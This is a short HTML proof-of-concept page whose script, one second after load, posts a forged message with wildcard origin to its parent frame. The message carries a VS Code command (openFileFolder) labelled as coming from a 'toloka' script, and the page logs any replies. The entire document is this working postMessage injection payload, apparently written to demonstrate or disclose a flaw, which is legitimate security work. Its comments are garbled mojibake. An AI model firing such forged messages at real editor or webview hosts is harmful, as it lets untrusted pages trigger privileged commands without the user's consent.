<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>iframe PoC</title>
</head>
<body>
  <h2>PoC - Send PostMessage to Parent</h2>

  <script>
    // Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªÙŠ Ø³Ù†Ø±Ø³Ù„Ù‡Ø§ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ø£Ù…
    const message = {
      direction: "from-toloka-script",
      vscodeMessage: {
        command: "workbench.action.files.openFileFolder",
        arguments: []
      },
      vscodeScheduleAsyncWork: 123456
    };

    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© Ù…Ù† ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    setTimeout(() => {
      console.log("ğŸ“¤ Sending message to parent");
      parent.postMessage(message, "*");
    }, 1000);

    // ØªØ³Ø¬ÙŠÙ„ Ø£ÙŠ Ø±Ø³Ø§Ù„Ø© ØªØµÙ„Ùƒ Ù…Ù† parent
    window.addEventListener("message", (event) => {
      console.log("ğŸ“¥ Received message from parent:", event.data);
    });
  </script>
</body>
</html>

